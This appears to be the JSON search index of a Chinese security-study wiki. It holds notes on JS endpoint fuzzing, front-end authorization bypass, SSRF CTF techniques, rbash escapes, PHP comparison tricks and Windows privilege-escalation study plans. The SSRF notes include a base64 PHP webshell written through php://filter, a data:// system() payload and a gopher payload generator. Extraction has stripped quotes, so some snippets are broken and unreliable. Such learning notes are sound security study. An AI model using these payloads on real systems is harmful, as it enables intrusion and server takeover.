[{"title":"Hello World","path":"/2025/12/23/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new My New Post More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment"},{"path":"/wiki/Web知识点/CRLF.html","content":"CRLF 更新: 2025-10-30 16:58:04原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/qckli5cq72lf4vs5"},{"path":"/wiki/内网/权限维持.html","content":"权限维持SharPersist.exe 更新: 2025-11-11 20:13:00原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/gb5ph55x89udgr9n"},{"path":"/wiki/笔记/JS渗透.html","content":"JS渗透先找到JS文件 熊猫头 Packer-Fuzzer 异步js JS接口提取 脚本文件 目录FUZZ和接口提取的奇妙搭配 我们假设你通过分析JS找到了很多接口，比如 http://test.hack.com/api/test/admin/delete http://test.hack.com/api/test/admin/edit http://test.hack.com/api/test/admin/get 这种时候我们要注意了，接口的命名一般都和功能高度相关。这里有管理员用户的删除（delete）、编辑（edit）、获取（get） 那么你还能想到什么？是不是有可能能有添加（add、create）。那我们可以注意FUZZ这个点 http://test.hack.com/api/test/admin/add http://test.hack.com/api/test/admin/create 总之就是有“添加”这个意思的单词。对于增删改查的接口关键词，我自己总结了一些。 查询（获取信息）search list select query get find 删除（删除某个数据）del Delete 编辑（更新某个信息）Update Up edit Change 添加（增加某个信息）add create new API测试 GET POST 测试 别忘了路径可能有问题 POST参数测试 返回内容拼接 JS查找 脚本获取 路径三种情况 第一种是目标站点没有任何对前端uri的鉴权。我们这么去访问，能直接看到页面，也不会给你跳转啥的，这时候就可以调用页面上的功能去抓包，分析这些功能点对应的接口的问题了。 第二种情况稍微好点，就是你这么去访问，有概率看到要访问的页面闪一下，然后给你重定向回登录页面，这种时候有种拼手速的玩法，在重定向回登录页面之前，浏览器上的刷新按钮会变成这个状态：在他重定向回去之前，快速点一下这个X，那么后续动作就会终止执行，你的页面就会卡住。这时候我们也是开启burp愉快抓包就行。其实就是阻止重定向的思路。 - font style=color:rgb(0,0,0);第三种情况就是，我们没法看到想访问的页面，前端要么没反应，要么给你弹出个没有权限，要么直接重定向到/fontfont style=color:rgb(0,0,0);/login/fontfont style=color:rgb(0,0,0);登录页。这种时候我们又该怎么测试呢？下面的内容就需要一点前端调试和/fontfont style=color:rgb(0,0,0);JS/fontfont style=color:rgb(0,0,0);分析的基础了，本文不会深入展开，仅作案例介绍。/font 假设这么一个网站，我们提取出一个前端uri为home （很常见） 我们自然要尝试访问，一访问，发现直接给我们重定向到登录口 我们自然要尝试访问，一访问，发现直接给我们重定向到登录口 这就说明这个前端至少有两层校验，一层与用户登录状态有关，一层与用户权限有关。怎么办呢？我们在控制台搜索“内测”关键词，定位到用户权限鉴权逻辑。 分析这个局部，我们其实很容易能注意到这里的前端鉴权逻辑。前端获取o.state.account.permission属性，一旦这个属性为false，那么就会提示平台内测这个错误，无法访问到对应的前端uri。 那么用户登录状态对应什么属性呢？往上翻一下，不难看出对应o.state.baseInfo.isLogin属性 因此我们可以推测，state中保存了用户的基本信息，比如登录状态、权限等等。因此这里好办了，我们给上述两个位置打上断点，重新访问home。进入第一个断点 在控制台将其强行改为true 进入下一断 同样地，再控制台对其赋值为1 再往下走，此时会跳转到一个contract页面 虽然没进入home页面，但是这样，我们就来到了一个原本无法直接访问到的一个前端uri，这样就可以调用它的功能了，看这个页面要填的东西很多，最后的传参肯定巨复杂，就算开发好心告诉你缺了什么参数，你敲都要敲半天，用这种方法测起来就快多了。 当然，我们的目的是进入home页面，重定向到这个完善账号信息的页面，说明还是有哪里的鉴权没搞好，我们再回到刚刚的鉴权逻辑部分 可以发现，后续其实还对o.state.account.permission的值做了一个判断，如果值为1，那么会直接进入contract页面。值只要是大于1的整数，其实都可以访问到home页面 因此在控制台将permission改为3 再访问home，成功： 这样，我们就可以愉快的测试后台的各种功能点了。当然上述操作对不懂JS和前端调试的师傅肯定也不太友好。实际上上述操作和平时测试业务逻辑漏洞中的“修改返回包”操作是有等价关系的。为什么这么说呢？ 我们重新访问一下home页面，然后在burp抓包，拦截一下返回包。 可以看到一个state_user的后端接口，从这个接口的名字我们其实就知道，它是用来判断一个用户状态的。 然后你再注意这里的account_state，默认是0。以及这个is_login，默认是false。他们是不是就特别像我们刚刚在JS里分析出来的o.state.account.permission和o.state.baseInfo.isLogin？我们推测这个前端实际上就是从返回包里拿到account_state和is_login，并分别给o.state.account.permission、o.state.baseInfo.isLogin赋值的。 因此我们将其分别改为3和true，然后把另一个code改为200，发包 还是能看到后台页面。这样虽然操作起来比较简单友好，但是万一目标前端对响应结果的判断设置的比较复杂，那就不是那么好办了，比如我前端判断permission为test123abcdef才为有效，我们常见的改响应包的方法就很难改成这样了，所以还是回到JS去分析调试才能应对大部分奇葩情况，还是比较吃基本功的。 json传参里常见的类型其实也就是下图这些 a为整型，b为字符串类型，c为布尔类型，d为数组类型，e为对象类型。这几种类型都试一下准没错，而且大多数情况下类型错了后端是要直接抛出异常信息的，从异常信息里就很容易能看出来这个地方要传入什么类型，比如异常里看到xxxxx Object xxxxxx，就可以猜测某个参数可能要传入对象类型的传参。 更新: 2025-10-10 13:18:01原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/srez18cb84d0c7gs"},{"path":"/wiki/Web知识点/SSRF.html","content":"SSRF 更新: 2025-10-30 16:42:25原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/clrqweba0dng1ltw"},{"path":"/wiki/Web知识点/漏洞发现.html","content":"漏洞发现 更新: 2025-09-06 13:59:54原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/3921a518486a033747e581924ded78f0"},{"path":"/wiki/Web知识点/CSRF.html","content":"CSRF 更新: 2025-10-30 16:42:10原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/sa9z2ctw8pzyp4lp"},{"path":"/wiki/Web知识点/CORS.html","content":"CORS 更新: 2025-10-30 16:41:59原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/py1kigwbspmyezds"},{"title":"SSRF_内网访问","path":"/wiki/WP/SSRF_内网访问.html","content":"SSRF_内网访问 伪协议 file://php://input # 执行php代码php://filter # 读取源码 write的话GET提交?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOST提交content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=zip:// #压缩文件data:// #执行php代码 ?url=data://text/plain,?php system(ls);? gopher协议 gopher协议（攻击内网服务的万金油）：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell(具体看脚本文件)from urllib.parse import quotepayload = \\POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=260a97ac2ef360dec36238c7d6c49c25payload = quote(payload)payload = payload.replace(%0A, %0D%0A)payload = fgopher://127.0.0.1:80/_quote(payload)print(payload)URL: gopher://host:port/gopher-path_后接TCP数据流---也就是构造的包（要进行url编码，具体几次看情况）(!!!一定要有下斜杠)gopher协议中的post请求需要包含几个必要的字段HOST，Content-Length,Content-Type POST请求编码出来的换行是%0A，就需要把%0A改成%0D%0Agopher://127.0.0.1:80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D260a97ac2ef360dec36238c7d6c49c25%250D%250A fastcgi协议（进程间通信） CGI协议 # 访问url -- 浏览器生成HTTP请求报文 -- web server解析请求（例如nginx）web server 是内容的分发者当访问静态页面时，web server 会直接返回资源，例如index.html当访问动态页面时，web server 会调用解析器，例如index.php # -- 访问CGI# -- CGI初始化环境，加载配置，处理请求，返回资源，结束进程 （每次处理请求后都会销毁进程，浪费资源）FASTCGI # 访问url -- 浏览器生成HTTP请求报文 -- web server解析请求（例如nginx）当访问index.php时，web server 会把HTTP请求转换为FastCGI请求# -- 转换为FastCGI协议格式并发送给解析器，这里以php为例# -- 发送至php-fpm process managerphp-fpm接收到请求后，把请求分配给一个worker，worker就是一个解析服务的进程（一直运行），worker根据请求信息，解析php，返回页面例如，招新平台运行了15个worker，（不考虑nginx处理时间）同时可以处理15个请求# -- php-fpm解析并响应 redis 协议，和上面一样，可以直接用gopherus 的redis模块 ，使用默认的，会自动生成shell.php cmd为密码 SSRF Bypass url Bypass 1.使用HTTP基础认证 HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。也就是：http://www.xxx.com@www.yyy.com形式简单来说，就是http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容。这里的@是主域名解析，即@符号后面直接跟域名，@符号前面的内容会被视为用户名，相当于以http://baidu.com的用户名访问192.168.0.1/flag.php，至于用户名是啥不重要，关键是@后面的才是解析的地址！2.使用nip.io .nip.io 是一个特殊的域名后缀，它提供了一种免费且简便的方式，可以将特定格式的域名解析为对应的IP地址，可以作为应用路由的解析服务。这省去了配置本地hosts文件的步骤。例如，当访问http://anything-IP Address.nip.io时，它将解析到对应的IP地址IP Address?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php 数字IP Bypass 1.ip转int 2.十六进制3.八进制4.localhost、http://0/等5.ipv6绕过 302跳转 Bypass 需要vps 暂时跳过 DNS重解析 对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass过滤掉.但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击，利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：1、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP2、对于获得的IP进行判断，发现为非黑名单IP，则通过验证3、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址4、由于已经绕过验证，所以服务器端返回访问内网资源的结果总结来说：由于我们无法在程序运行时以毫秒为单位手动更改DNS记录，所以要想实现DNS重绑定攻击，就必须配置一个自定义的恶意DNS服务器，并设定好指定域名的解析IP，再将TTL设置为0，使其解析时在非法内网IP与合法其他IP间反复横跳。用下面这个网站可以进行DNS重绑定rbndr.us dns rebinding service (cmpxchg8b.com)绑定的两个ip中保证有一个是127.0.0.1即可，我这里和192.168.0.1绑定了，结果为7f000001.c0a80001.rbndr.us因此我们的url=7f000001.c0a80001.rbndr.us/flag.php ，注意这个域名相当于绑定了两个ip地址（同一时刻只对应一个），由于无法确定进行dns校验时的ip是否为127.0.0.1，可能一次请求不成功，多刷新几次即可。 更新: 2025-09-06 15:37:14原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/0b1e379e430509d3eed3416797cda2f2"},{"path":"/wiki/笔记/linux学习.html","content":"linux学习stdin stdout stderr对应文件标识符：0 1 2 如果我们想将 STDOUT 和 STDERR 重定向到一个文件，我们可以使用。这个“”代表 FD 1 和 FD 2 表示 1和2 重定向 追加 覆盖 | 管道符 rm -r r 递归创建文件 touchuniq 去除相邻重复行 想要去除整个文件，可以先sort，然后去除 cat animals | tee unsorted.txt | sort | uniq sorted.txt tee的作用是将另一个命令输出的 STDIN 传递过去，同时将副本写入文件 用户权限 uid(用户标识符) root 0 普通 1-501 useradd -u 指定uid -d 指定目录 passwd -d 清空密码 -l 锁定账户 -u 解锁 -S 是否锁定 usermod -l 更改名字 -L 锁定 -U 解锁 userdel -r 文件权限or目录权限 r w x chmod -R递归修改权限 umask 设定文件初始权限 chown 属主 文件或目录 set位 s 粘滞位 t 共享文件用 chattr i 全锁 a 修改锁 +，-，用法相同 网络route route add -net 我要去哪 gw 下一跳地址 route add default gw 网关 修改网络 vim etcsysconfignetwork-scriptsifcfg-xxx BOOTPROTOdhcp -static onbootyes ipaddr netmask gateway dns1 dns2 查看dns cat etcresolv.conf 更新: 2025-10-15 21:40:06原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/ahavlbt7uccdpzqb"},{"path":"/wiki/笔记/网络.html","content":"网络lan–wanNAT –switch–route lan 局域网，switch 是按mac地址区分，一旦经过路由器，就会变成ipdns查看上一条信息是否成功 echo $? 更新: 2025-10-20 15:25:41原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/tp3pvsnegaasf0nd"},{"path":"/wiki/WP/Linux提权/rbash.html","content":"rbash什么是rbashrbash,即受限制的 bash,其可以用作中转服务器（实际上rbash只是bash的一个软链接）。它与一般shell的区别在于会限制一些行为，让一些命令无法执行。 如何设置rbash1，复制一个bash，重命名为rbash cp /bin/bash /bin/rbash2，设置用户tom登陆的shell为rbash useradd -s /bin/rbash tom3, 在tom用户下新建一个.bin目录存放可以执行的命令 mkdir -p /home/tom/.bin4, 通过软连接执行命令 ln -s /bin/clear /home/$tom/.bin/clear5, 编辑文件/home/$tom/.bashrc,添加export PATH=$HOME/.bin/.文件一定要以# .bashrc为首行. 如何绕过限制信息收集tom@DC-2:~$ echo $PATH/home/tom/usr/bintom@DC-2:~$ echo /home/tom/usr/bin/*/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/viemv 查看环境变量 特别是查看shell 和PATH检查编程语言 java php ...sudo -l 常见的逃逸技术 “ ” 如果允许，直接运行binbash cp cp /bin/bash test1cp /bin/sh test2./test1 # 切换到了/bin/bash./test2 # 切换到了/bin/sh 常见的应用 1 ftp,gdb,man ftp !/bin/sh gdb !/bin/sh man !/bin/sh2 git git git help status3 vi/vim :set shell=/bin/bsah :shell 或者 :!/bin/bash4 BASH_CMDS[a]=/bin/sh;a #把/bin/bash给a变量export PATH=$PATH:/bin/ #将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin #将/usr/bin作为PATH环境变量导出 更新: 2025-09-06 15:37:01原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/ca7ebaef688bfe9b86bf019ceb832831"},{"path":"/wiki/笔记/计划B.html","content":"计划B周 1：打牢基础与枚举（目标：能用脚本手动方法做完整枚举） Tr0ll：靶场渗透测试流程涵盖环境搭建、网络扫描、端口扫描、服务版本扫描、FTP 匿名登录、SSH 爆破、内核漏洞提权和修改 Python 脚本等多个环节。 SickOs 1.2：靶场中存在计划任务提权、chkrootkit 提权等提权方式。 周目标：熟练掌握 Windows 权限模型、帐户组ACL、服务与任务计划的枚举；学会快速找出可疑点并定位提权入口。 Day 1 — 理论回顾与环境准备（入门 2–3 小时） 目标：确认环境、安装更新工具（在本地或靶机上）。 操作： 搭建或导入 VM（Metasploitable3 Windows 本地 Windows 102016）；快照。 准备工具：PowerShell（含 PowerShell 7 如可用）、winPEAS、SharpUp、Seatbelt、Sysinternals（PsExecProcExplorerAutoruns）、Mimikatz（仅用于授权实验）。 产出：环境快照 + 工具清单 Day 2 — 用户权限组ACL 枚举（2–4 小时） 目标：手动与脚本化列举本地域用户、组、ACL、服务权限。 操作： 手工命令：whoami /all、net user、net localgroup、sc queryex、schtasks /query /v、icacls、Get-LocalUser 等。 运行 winPEAS SharpUp，比较手动结果与工具结果。 产出：枚举清单（text），标注高危配置项（可写服务、可改计划任务、可读取凭证位置） Day 3 — 服务滥用与可写文件枚举（2–4 小时） 目标：识别可写服务二进制、服务参数、可替换 DLL 和可写脚本。 操作： AccessChk sc qc 查看服务路径及权限；查找可写目录（icacls PowerShell）。 尝试利用可写服务路径做本地提权（不要在生产机上执行）。 产出：至少 1 个可疑服务路径记录与复现步骤（模拟利用思路） Day 4 — 计划任务、启动项、注册表持久化点（2 小时） 目标：掌握任务计划、启动项与注册表的枚举定位。 操作：schtasks /query /fo LIST /v、检查 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 等。 产出：任务计划汇总 + 高危持久化点列表 Day 5 — 凭证发现：明文配置文件凭据缓存（2–3 小时） 目标：学会定位常见凭证存放点（配置文件、IIS、SSMS、RDP、Windows Credentials）以及 LSASS 的基本概念。 操作：查找 .config、.rdp 文件、%APPDATA%、Credential Manager 导出思路（仅记录，不做 dump）。 产出：凭证线索清单 Day 6–7 — 实战 1 台靶机（周末集中练习，4–6 小时） 目标：用本周学到的方法做一台完整靶机练习（枚举 → 找到提权路径 → 复盘）。 操作： 任选 TryHackMeHTB 一台难度低的 Windows 机器或本地 Metasploitable3。 输出：攻击日志（步骤 + 命令），发现的提权点，修复建议。 产出：靶机复盘报告（含截图命令行片段） 周 2：常见本地提权技术与工具（目标：熟练实战利用与验证）周目标：掌握并实战常见提权利用链（服务、计划任务、凭证滥用、令牌窃取、DLL 搜索顺序、组策略、UAC 绕过等）。 Day 8 — TokenImpersonation 与 UAC（2–3 小时） 目标：理解 Windows Token、Impersonation、UAC 的工作机制与常见绕过思路。 操作：阅读练习 whoami /all、Invoke-TokenManipulation（PowerSploit 风格）等（只在靶机上）。 产出：Token 测试记录与能用的提权思路 Day 9 — 服务替换 可写服务利用（2–3 小时） 目标：把 Week1 发现的可写服务路径实际利用（在测试靶机上）并拿到 SYSTEM。 操作：模拟上传二进制或 DLL（在授权环境）、使用 sc psexec 等辅助（注意安全）。 产出：利用步骤与防护建议 Day 10 — 凭证提现（LSASS、Creds in Files）与 Mimikatz 概念（2–3 小时） 目标：理解 LSASS dump、Windows 凭证缓存和如何安全验证凭证可用性（在靶场上）。 注意：仅在授权环境使用 Mimikatz 并在报告中标注风险与责任。 产出：凭证泄露复现实验记录（仅在靶场上） Day 11 — 三方工具与自动化（winPEAS SharpUp 深入）（2 小时） 目标：熟练使用并阅读 winPEASSharpUp 输出，学会判断误报。 操作：在至少两台不同配置的靶机上运行并对比输出。 产出：工具输出对比表 + 误报真报判定规则 Day 12 — AD域上下文入门（如果是域环境）（2–3 小时） 目标：理解域用户域权限常见提权路径（Kerberoast、ACLs、Kerberos delegation、PSExec lateral 等概念）。 操作：如果没有域靶机，可做理论与 BloodHound 基本介绍（概念优先）。 产出：域内高频提权路径清单 Day 13–14 — 实战 1–2 台靶机（周末实战，4–8 小时） 目标：专注实战：找出并利用至少两条不同类型的提权路径（例如：服务替换 + 凭证导出）。 产出：2 台靶机的完整复盘（包含防御修补建议） 周 3：高级方法、漏洞利用与链式利用（目标：能把多个弱点串成链并写报告）周目标：掌握链式利用（从低权限到 SYSTEM 再到域控或持久化）、内核级漏洞概念、完整渗透流程与书面复盘。 Day 15 — 链式利用思维（2 小时） 目标：学习如何把弱点串联（例：从可读文件中拿到凭证 → 横向或本地利用 → 提权到 SYSTEM），并写出利用树（Attack Tree）。 产出：1 页攻击树模板（可用于后续靶机复盘） Day 16 — 内核驱动漏洞概览（2–3 小时） 目标：理解内核驱动漏洞基本类型（权限提升用的 kernel exploits）、安全边界与 mitigations（PatchGuard、DEP、ASLR）。 注意：不要在真实系统上尝试真实 exploit。只学习概念与修复思路。 产出：内核漏洞风险 修补检查项清单 Day 17 — 持久化与清理（2 小时） 目标：学会持久化常见点（服务、计划任务、注册表、WMI），同时学会如何在应急响应中检测清理这些持久化方法。 产出：持久化样板（用于授权环境）与检测清理清单 Day 18 — 报告写作与漏洞修复建议（2–3 小时） 目标：把靶机攻防过程写成结构化报告（枚举 → 发现 → 利用 → 修复建议）。包含 CVSS 思路优先级。 操作：以之前实践为样本写 1 篇完整小报告（1–2 页）。 产出：示例复盘报告 Day 19–21 — 最终考核练习（集中：6–10 小时 分配到三天） 目标：在 1–2 台综合靶机上进行端到端渗透与提权（初始权限→ SYSTEM域内高权限→写报告）。 要求交付物： 攻击日志（命令 + 截图） 两页以内的复盘（高危问题、修复建议、检测点） 一份“防御清单”（运维可直接执行的修复步骤） 复盘重点：阐明每一步为什么可行、如何修复以及如何检测类似手法。 工具脚本清单（建议熟练掌握） PowerShell 原生命令（Get-Process、Get-Service、Get-ScheduledTask、Get-ChildItem -Recurse 等） Sysinternals（PsExec、ProcExplorer、Autoruns、AccessChk） winPEAS SharpUp Seatbelt（枚举） Mimikatz（仅测试环境） Rubeus（Kerberos 工具，域环境） BloodHound（域攻防概念学习） BurpVSCodeNotepad++（文本分析） 测试环境推荐（仅作路径指引） 在线平台：TryHackMe（入门Windows PrivEsc rooms）、HackTheBox（Windows 专题靶机） 离线镜像：Metasploitable3 Windows、VulnHub 上 Windows 类型靶机（我未在此列出具体靶机名，避免过时错配；建议优先使用平台上的“Windows Privilege Escalation”专题房间与难度为 Easy→Medium 的靶机开始） 交付物样板（每台靶机必须产出） 一页“快速事实表”：靶机名、初始权限、最终权限、主要漏洞点。 攻击流程：枚举 → 关键发现 → 利用命令（可复制） → 结果。 修复建议：最少 3 项具体可执行措施。 检测建议：SIEMEDR 应关注的日志检测规则提示（如异常服务创建、LSASS dump 活动、计划任务修改等）。 额外建议（效率与安全） 每次实战前先拍快照，实战结束写日志再回滚。 记录每个命令和输出（用于写报告与复盘）。 强制遵守授权与合规：不要在真实产线上测试，保存并标注所有敏感工具的使用场景与限制。 练习频率：若时间允许，三周后保留每月一次的复盘练习以固化技能。 更新: 2025-11-03 19:24:50原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/ud5o9zy853ussqh7"},{"path":"/wiki/WP/PHP特性/MD5绕过.html","content":"MD5绕过知识点弱比较类型字符串和数字进行比较时，会把字符串强制转换为数字(如果字符串开头有数字，则转换为开头数字，没有则转换为0) ==：只比较数据值——数据值相同，不比较数据类型!=: 只比较数据值——数据值不同 var_dump(123==123a);#bool(true)var_dump(123==1234a);#bool(false)var_dump(0==abc);#bool(true) 强比较类型不仅要比较数据的值也要比较数据的类型，例如str和int两种数据类型就不会相等 ===：比较数据类型——数据类型相同 比较数据值——数据值相同!==：比较数据类型——数据类型不同 || 比较数据值——数据值不同 var_dump(123===123a);#bool(false)var_dump(123===123);#bool(false)var_dump(123===123);#bool(true 当php处理字符串时，会利用“ ”或者“ ”来比较 当“”时： php把每一个以”0E”开头的哈希值都解释为0，所以要绕过””，需要想办法让两边的不同数值经过md5加密后都为“0E”开头，这样当处理到这里的代码时，php会认为它们两个都为0，即可绕过。 开头为0E（MD5值）字母数字混合类型：s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904纯大写字母：QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e782601363539291779881938479162纯数字：2406107080e46209743190650901956298873685440116270630e48580568703443990593836270177547756350650e99821208994664096759945036116847905553610e643442214660994430134492464512 5432453531 0e51231869908588163086189052609755796798200e877622011730221803461740184915 55853935790e66435735538230580599276533702363765525010e165886706997482187870215578015 7124129977 0e500007361044747804682122060876 71975461970e9151885760724691014573156755027656486157 0e451569119711843337267091732412 php中的md5()函数无法处理数组类型数据，对于数组类型数据返回NULL，当我们传入两个数组时，就会变成两个NULL，也就是NULLNULL，成功绕过 当为“”：在类型相同时才相等。”“即non-strict比较符，会在类型转换后进行比较。 此外0 字符会被认为是正确的，可以绕过验证。 更新: 2025-09-06 15:37:02原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/bc6eaf3968bed6a3fc93a27187f8e482"},{"path":"/wiki/WP/PHP特性/特性.html","content":"特性1.intval()intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 intval($num, 0) 的作用:intval() 是 PHP 函数，用于将变量 $num 转换为整数。参数 0 表示进制自动检测：如果 $num 以 0x 或 0X 开头（如 0x117c），按十六进制转换。如果 $num 以 0 开头（如 010574），按八进制转换。其他情况（如 4476），按十进制转换。 2. 正则show_source(__FILE__);include(flag.php);$a=$_GET[cmd];if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; /i表示匹配大小写字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾/m 多行匹配 若存在换行 并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配但是当出现换行符 %0a的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾 3.in_array()in_array(search,array,type)如果给定的值 search 存在于数组 array 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 false。注释：如果 search 参数是字符串，且 type 参数设置为 true，则搜索区分⼤⼩写。 没有第三个参数的时候进⾏的就是弱⽐较，就会存在强制的类型转换，如123.php就会转换成123 4.优先级 and5. 反射类反射类ReflectionClass执⾏命令ReflectionClass反射类在PHP5新加⼊，继承⾃Reflector，它可以与已定义的类建⽴映射关系，通过反射类可以对类操作反射类不仅仅可以建⽴对类的映射，也可以建⽴对PHP基本⽅法的映射，并且返回基本⽅法执⾏的情况。因此可以通过建⽴反射类new ReflectionClass(system(cmd))来执⾏命令 6.is_numeric()is_numeric() ⽤于检测是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true ，否则返回false。如果字符串中含有⼀个e代表科学计数法，也可返回true。 7.call_user_func()call_user_func() 函数⽤于调⽤⽅法或者变量，第⼀个参数是被调⽤的函数，第⼆个是调⽤的函数 的参数 8. 更新: 2025-09-06 15:37:04原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/25c2574e5d6ccb9a7e395d386974f41c"},{"path":"/wiki/笔记/计划.html","content":"计划Day 1 - 环境搭建与基础认知 上午 9:00-11:00 30min：了解内网渗透的法律边界与道德准则，强调其重要性，确保后续学习和实践合法合规。 45min：学习虚拟网络的三种模式（NATHost-onlyBridged），理解其原理和适用场景，为搭建实验环境做好准备。 45min：规划实验拓扑结构（Kali + DC + Web Server + Client），明确各组件的功能和相互关系，绘制简单的拓扑图草稿。 下午 14:00-18:00 60min：安装VMwareVirtualBox，创建Kali虚拟机，确保安装过程顺利，熟悉虚拟机软件的基本操作。 90min：部署Windows Server 20122016作为域控制器，按照标准步骤进行安装和配置，重点关注域控制器的关键设置。 90min：配置一台Windows 10作为客户端，加入域环境，验证域加入成功，确保各虚拟机之间网络通信正常。 今日产出：完整的内网实验环境，包含3台以上的虚拟机，并确保各虚拟机之间能够正常通信，拓扑图草稿清晰准确。 Day 2 - 系统层面信息收集 上午 9:00-11:00 30min：学习systeminfo各字段的含义，通过实际运行命令查看输出，结合文档理解每个字段所代表的信息。 30min：掌握whoami all中的特权权限说明，分析输出结果，了解不同权限对系统操作的影响。 60min：理解WMIC命令的结构和使用方法，通过示例命令熟悉其语法和功能，为后续信息收集做好准备。 下午 14:00-18:00 60min：逐条运行系统信息收集命令（包括systeminfo、whoami all、WMIC等），记录输出结果，确保命令执行无误，输出完整。 60min：分析补丁信息，学习KB编号的意义，了解补丁对系统安全和稳定性的影响，结合实际输出进行解读。 60min：手工生成第一份《目标系统简报》，总结收集到的信息，按照一定的格式进行整理，突出关键信息。 今日产出：手写的系统信息收集清单和解读笔记，内容详细准确，简报格式规范，信息清晰易懂。 Day 3 - 用户、网络与服务侦查 上午 9:00-11:00 45min：学习Windows用户和组的层次结构，理解其在系统管理中的作用，通过实际查看用户和组信息加深理解。 45min：理解网络连接的TCP状态含义，结合网络抓包工具（如Wireshark）观察实际网络连接状态，加深对TCP状态的理解。 30min：学习Windows服务的架构和工作原理，了解服务在系统中的运行机制，为后续服务侦查做好准备。 下午 14:00-18:00 60min：枚举所有用户、组和会话信息，使用命令行工具（如net user、net group、query session等）获取信息，并进行整理和分析。 60min：分析网络连接和防火墙配置，使用工具查看防火墙规则，结合网络连接状态分析防火墙对网络通信的影响。 60min：深入研究服务配置（sc qc, sc queryex），了解服务的启动类型、依赖关系等关键信息，分析潜在的安全风险。 今日产出：完成的网络拓扑图（细化网络连接和防火墙配置部分），用户权限矩阵（明确用户、组的权限关系），服务配置分析报告（突出潜在风险点）。 Day 4 - 文件系统与权限审计 上午 9:00-11:00 60min：学习Windows ACL权限模型，理解其基本概念和工作原理，通过实际查看文件和目录权限进行验证。 60min：理解不同文件权限的实际含义，结合实际案例分析权限对文件操作的影响，掌握常见权限问题的判断方法。 下午 14:00-18:00 75min：使用icacls逐一检查关键目录权限（如系统目录、用户目录、共享目录等），记录权限配置情况，发现潜在的权限问题。 75min：下载并学习使用Sysinternals Suite中的AccessChk，通过实际操作熟悉其功能和使用方法，对比icacls和AccessChk的输出结果，分析差异。 今日产出：发现的3个以上权限配置问题及验证过程（包括问题描述、验证方法、验证结果等），权限审计报告（总结关键目录权限配置情况和发现的问题）。 Day 5 - 自动化工具集成 上午 9:00-11:00 60min：研究WinPEAS的检查项目分类，了解其涵盖的各个方面（如系统信息、用户权限、服务配置等），分析其检查逻辑。 60min：分析PowerUp的工作原理，理解其在权限提升方面的优势和局限性，结合实际案例进行说明。 下午 14:00-18:00 90min：分别运行WinPEAS的bat和exe版本，在不同系统环境下（如Windows 7、Windows 10等）观察输出结果，记录差异。 90min：在PowerShell中导入并运行PowerUp，熟悉其命令和功能，结合实际场景进行权限提升测试。 60min：制作工具输出对比分析表格，对比WinPEAS和PowerUp的输出结果，分析各自的优缺点和适用场景。 